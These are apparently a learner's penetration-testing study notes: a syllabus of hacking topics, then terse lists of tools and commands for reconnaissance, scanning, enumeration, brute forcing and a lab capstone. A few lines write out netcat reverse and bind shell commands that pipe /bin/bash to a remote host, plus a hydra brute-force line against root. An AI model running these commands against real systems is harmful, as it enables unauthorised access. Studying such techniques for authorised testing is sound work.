### 1. **Networking Basics**
   - **IP Addressing & Subnetting**
   - **TCP/IP Protocol Suite**
   - **Common Protocols:** HTTP, HTTPS, FTP, SMTP, DNS
   - **Firewalls, Routers, Switches**

### 2. **Operating Systems**
   - **Linux Basics** (especially Kali Linux)
   - **Windows Command Line & PowerShell**
   - **File Systems, Processes, and Services**

### 3. **Programming/Scripting**
   - **Python** (commonly used for scripting attacks)
   - **Bash Scripting**
   - **Understanding C/C++** (for exploit development)
   - **JavaScript** (for web hacking)

### 4. **Web Technologies**
   - **HTML/CSS/JavaScript**
   - **HTTP/HTTPS**
   - **SQL Basics**
   - **Web Servers (Apache, Nginx)**

### 5. **Security Concepts**
   - **Cryptography Basics**
   - **Hashing Algorithms (SHA, MD5)**
   - **Public Key Infrastructure (PKI)**
   - **Authentication and Authorization**

### 6. **Penetration Testing Tools**
   - **Nmap** (Network Scanning)
   - **Wireshark** (Packet Analysis)
   - **Metasploit** (Exploitation Framework)
   - **Burp Suite** (Web Application Testing)

### 7. **Vulnerability Analysis**
   - **OWASP Top 10 Vulnerabilities**
   - **Common Vulnerabilities and Exposures (CVE)**
   - **Exploitation Techniques**

### 8. **Ethical Hacking Techniques**
   - **Footprinting & Reconnaissance**
   - **Scanning & Enumeration**
   - **Exploitation & Gaining Access**
   - **Maintaining Access & Covering Tracks**
   - **Social Engineering**

### 9. **Wireless Security**
   - **Wi-Fi Security (WEP, WPA, WPA2)**
   - **Wireless Attacks (WPA Cracking, Deauthentication)**
   - **Bluetooth Hacking**

### 10. **Malware Analysis**
   - **Types of Malware (Viruses, Trojans, Ransomware)**
   - **Reverse Engineering**
   - **Sandboxing**

### 11. **Legal and Ethical Considerations**
   - **Cyber Laws**
   - **Ethical Hacking Standards**
   - **Responsible Disclosure**

- VMWARE - VirtualBox - Kalix64
- **User & Privileges**

- pimpmykali
- cat echo touch nano
- scripting with bash
- grep cut
- ipsweep.sh
- nmap
- python scripting
	- sockets
- 5 stages of ethical hacking
	- COVERING TRACKS
	- RECONNAISSANCE - active and passive
	- SCANNING & ENUMERATION - Nmap, Nessus, Nikto
	- GAINING ACCESS - 'Exploitation'
	- MAINTAINING - access
- Passive Recon
	- Information Gathering
	- Physical/Social - location - job information
	- Web/Host Assessment
		- TARGET VALIDATION 
		- FINDING SUBDOMAINS
		- FINGERPRINTING
		- DATA BREACHES
	- Identifying our Target
		- Bugcrowd - progrms - Tesla
		- Discovering email addresses
			- hunter.io
			- phonebook.cz
			- emailhippo
	- Breached Credentials
		- hmaberick - breach-parse
		- dehashed
	- Hunting Subdomains
		- Web information gathering
			- sudo apt install sublist3r
			- sublist3r -d tesla.com
			- crt.sh %tesla.com
	- Identifying website technologies
		- BUILTWIT.com
		- wapalizer
		- whatweb
	- Gathering Information with Burpsuite
		- kioptrix
	- Scanning with Nmap 
		- arg-scan -l
		- netdiscover -r ip/24
		- stuff scanning
		- nmap -T4 -p- -A ip
	- Enumerating HTTP/HTTPS
		- nikto -h https://ip
		-  dirbuster / gobuster
	- Enumerating SMB
		- nsfconsole
		- nsfvenom
		- smbclient -L \\\\ip\\
	- Enumerating SSH
		- ssh ip
		- ssh ip -oKexAlgorithms=+hvghv
	- Researching potential vulnerabilities
		- searchploit
	- Scanning with Nessus
	- Reverse shells vs Bind shell
		- nc -nvlp port || nc ip port -e /bin/bash
		- nc ip port || nc -nvlp -e /bin/bash
		- staged vs non-staged payloads || nsfconsole
		- openluck
	- Bruteforce Attack
		- hydra -l root -P /usr/share/wordlists/metasploit
	- Credential stuffing and password spraying

- Capstone
	- dhclient - academy setup || ip -a || nmap
	- hashcat to crack md5 hashes
		- locate rockyou.txt  
		- ffuf
		- pspy
		- bash reverse shell one liner
	- dev walkthrough
		- boltwire exploit
		- gtfobins
			- sudo exkelations || zip
			- jenkins exploit
			- foxy proxy
			- groovy reverse shell
